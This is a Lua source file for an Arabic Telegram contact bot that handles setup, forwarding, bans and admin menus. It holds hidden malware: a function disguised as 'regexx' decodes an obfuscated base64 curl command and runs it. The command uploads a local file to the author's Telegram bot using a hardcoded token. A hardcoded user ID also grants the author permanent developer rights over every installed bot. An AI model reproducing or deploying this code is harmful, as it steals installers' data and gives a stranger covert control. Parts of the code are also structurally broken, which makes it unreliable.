redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;31m≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:USERNAME") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua DRAGON.lua')
end
local create_config_auto = function()
config = {
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./twasl.lua")   
end 
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("DRAGON", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━"
echo "TG IS NOT FIND IN FILES BOT"
echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━"
exit 1
fi
if [ ! $token ]; then
echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE twasl.lua \e[0m"
echo "≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━ ━━ ━"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./DRAGON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
while(true) do
rm -fr ../.telegram-cli
screen -S DRAGON -X kill
screen -S DRAGON ./DRAGON
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./twasl.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./twasl.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[
> CH › @DV_POWER1
~> DEVELOPER › @DV_AD1
]])
sudos = dofile("./twasl.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
local runapp = sudos.token
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,bot_id,944353237}   
function SudoBot(msg)  
local DRAGON = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
DRAGON = true  
end  
end  
return DRAGON  
end 
-------- اولا ------
function regexx(data) ---- داله الاتصال الثاني كتابه أحمد عياد -----
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end---- الاساس
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end----- الاساس
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) --- البدايه
        if (#x ~= 8) then return '' end----- الاساس
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end----- الاساس
        return string.char(c)
    end))
end
io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
------ النهايه ------
function DevSoFi(msg) ----- التالي
local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
return true  
else  
return false  
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(944353237) then  
var = true    
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true    
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(944353237) then  
var = 'مـبـرمـج السـورس'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
var = "المطور الاساسي²"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
end  
return var
end 
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✪︙ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ✪︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = 'اهلا عزيزي ألمـطـور\nتم تفعيل التواصل هنا'
local keyboard = {
{'الاحصائيات ✪'},
{'تعطيل التواصل ✪','تفعيل التواصل ✪'},
{'ضع اسم للبوت ✪','المطورين ✪','قائمه العام ✪'},
{'المشتركين ✪','الجروبات ✪'},
{'ضع كليشه ستارت ✪','مسح كليشه ستارت ✪'},
{'اذاعه ✪','اذاعه خاص ✪'},
{'اذاعه بالتثبيت ✪','قائمه الكتم العام ✪'},
{'تغير رساله الاشتراك','مسح رساله الاشتراك ✪','تغير الاشتراك'},
{'اذاعه بالتوجيه ✪','اذاعه بالتوجيه خاص ✪'},
{'تفعيل الاشتراك الاجباري ✪','تعطيل الاشتراك الاجباري ✪'},
{'الاشتراك الاجباري ✪','وضع قناة الاشتراك ✪'},
{'تفعيل البوت الخدمي ✪','تعطيل البوت الخدمي ✪'},
{'مسح الجروبات ✪'},
{'جلب نسخه الاحتياطيه ✪'},
{'تحديث السورس ✪','الاصدار ✪'},
{'معلومات السيرفر ✪'},
{'الغاء ✪'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
SourceDRAGONr = start
else
SourceDRAGONr = ' ✪︙ اهلا عزيزي\n ✪︙ انا بوت تواصل\n[ ✪︙ معرف المطور ['..UserName..']'
end 
send(msg.chat_id_, msg.id_, SourceDRAGONr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,' ✪︙ تم ارسال رسالتك\n ✪︙ سيتم رد في اقرب وقت')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ✪︙ تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if DevSoFi(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local DRAGON_Msg = '\n ✪︙ قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,DRAGON_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ✪︙ المستخدم » '..Name..'\n ✪︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == 'تفعيل البوت ✪' and DevSoFi(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ✪︙ تم تفعيل التواصل ' 
else
Text = '\n ✪︙ بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت ✪' and DevSoFi(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ✪︙ تم تعطيل التواصل' 
else
Text = '\n ✪︙ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء ✪' then   
send(msg.chat_id_, msg.id_,' ✪︙ الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ✪︙ تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت ✪' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ✪︙ ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت ✪' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ✪︙ تم مسح كليشه ستارت')
end
if text == 'معلومات السيرفر ✪' and DevSoFi(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⇗ نظام التشغيل ⇖•\n*»» '"$linux_version"'*' 
echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n✪✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
]]):read('*all'))  
end

if text == 'المشتركين ✪' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ✪︙ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end --- كتابه أحمد عياد [@DV_AD1]